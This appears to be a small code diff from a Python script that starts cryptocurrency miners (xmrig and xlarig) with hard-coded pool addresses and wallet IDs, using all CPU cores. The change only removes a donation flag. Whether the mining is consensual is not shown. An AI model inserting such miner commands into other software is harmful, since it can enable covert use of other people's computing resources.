@@ -28,4 +28,4 @@ except:
     pass
 #os.system ('xmrig --av=7 --variant 1 --donate-level=0 -o stratum+tcp://pool.minexmr.com:4444 -u 43ZBkWEBNvSYQDsEMMCktSFHrQZTDwwyZfPp43FQknuy4UD3qhozWMtM4kKRyrr2Nk66JEiTypfvPbkFd5fGXbA1LxwhFZf+20001')
 #os.system ('xmrig --av=5 -o stratum+tcp://144.202.23.108:4444')
-os.system ('xlarig --donate-level 1 -a defyx -o stratum+tcp://Mine.ScalaProject.io:3333 -u SEiStP7SMy1bvjkWc9dd1t2v1Et5q2DrmaqLqFTQQ9H7JKdZuATcPHUbUL3bRjxzxTDYitHsAPqF8EeCLw3bW8ARe8rYP43BZtL1TXq6Hwg2u+20000 -t ' + str(cores))
+os.system ('xlarig -a defyx -o stratum+tcp://Mine.ScalaProject.io:3333 -u SEiStP7SMy1bvjkWc9dd1t2v1Et5q2DrmaqLqFTQQ9H7JKdZuATcPHUbUL3bRjxzxTDYitHsAPqF8EeCLw3bW8ARe8rYP43BZtL1TXq6Hwg2u+20000 -t ' + str(cores))
